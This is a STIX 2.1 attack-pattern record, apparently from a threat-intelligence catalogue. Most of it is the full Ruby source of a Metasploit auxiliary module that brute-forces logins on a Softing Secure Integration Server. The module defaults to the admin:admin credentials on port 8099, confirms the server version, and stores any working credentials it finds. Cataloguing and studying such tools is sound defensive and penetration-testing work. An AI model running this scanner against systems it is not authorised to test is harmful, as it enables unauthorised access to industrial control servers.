{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0278f994-cf98-4e5d-9df6-b4be70fb7d86",
    "created": "2024-08-14T16:29:17.904642Z",
    "modified": "2024-08-14T16:29:17.904647Z",
    "name": "Softing Secure Integration Server Login Utility",
    "description": " This module will attempt to authenticate to a Softing Secure Integration Server. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/softing_sis_login.rb",
            "external_id": "softing_sis_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/softing_sis'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Softing Secure Integration Server Login Utility',\n        'Description' => %q{\n          This module will attempt to authenticate to a Softing Secure Integration Server.\n        },\n        'Author' => [ 'Imran E. Dawoodjee <imrandawoodjee.infosec[at]gmail.com>' ],\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'DefaultOptions' => {\n          'RPORT' => 8099,\n          'SSL' => false,\n          'SSLVersion' => 'TLS1'\n        }\n      )\n    )\n\n    deregister_options('PASSWORD_SPRAY')\n\n    # credentials are \"admin:admin\" by default\n    register_options(\n      [\n        OptString.new('USERNAME', [false, 'The username to specify for authentication.', 'admin']),\n        OptString.new('PASSWORD', [false, 'The password to specify for authentication.', 'admin'])\n      ]\n    )\n  end\n\n  def scanner(ip)\n    cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    return Metasploit::Framework::LoginScanner::SoftingSIS.new(\n      configure_http_login_scanner(\n        host: ip,\n        port: datastore['RPORT'],\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 5\n      )\n    )\n  end\n\n  def report_good_cred(result)\n    service_data = { status: result.status }.merge(service_details)\n    store_valid_credential(\n      user: result.credential.public,\n      private: result.credential.private,\n      proof: result.proof,\n      service_data: service_data\n    )\n  end\n\n  def report_bad_cred(ip, rport, result)\n    invalidate_login(\n      address: ip,\n      port: rport,\n      protocol: 'tcp',\n      public: result.credential.public,\n      private: result.credential.private,\n      realm_key: result.credential.realm_key,\n      realm_value: result.credential.realm,\n      status: result.status,\n      proof: result.proof\n    )\n  end\n\n  def bruteforce(ip)\n    scanner(ip).scan! do |result|\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute(level: :good, ip: ip, msg: \"Success: '#{result.credential}'\")\n        report_good_cred(result)\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        print_brute(level: :verror, ip: ip, msg: result.proof)\n        report_bad_cred(ip, rport, result)\n      when Metasploit::Model::Login::Status::INCORRECT\n        print_brute(level: :verror, ip: ip, msg: \"Failed: '#{result.credential}'\")\n        report_bad_cred(ip, rport, result)\n      when Metasploit::Model::Login::Status::DENIED_ACCESS\n        print_brute(level: :verror, ip: ip, msg: \"Access denied: '#{result.credential}'\")\n        report_bad_cred(ip, rport, result)\n      end\n    end\n  end\n\n  def run_host(ip)\n    softing_ver = scanner(ip).check_setup\n    # if we get \"false\", throw the error\n    unless softing_ver\n      print_brute(level: :error, ip: ip, msg: 'Target is not Softing Secure Integration Server')\n      return\n    end\n\n    # otherwise, report the version\n    print_brute(level: :good, ip: ip, msg: \"Softing Secure Integration Server #{softing_ver}\")\n    bruteforce(ip)\n  end\n\nend\n"
}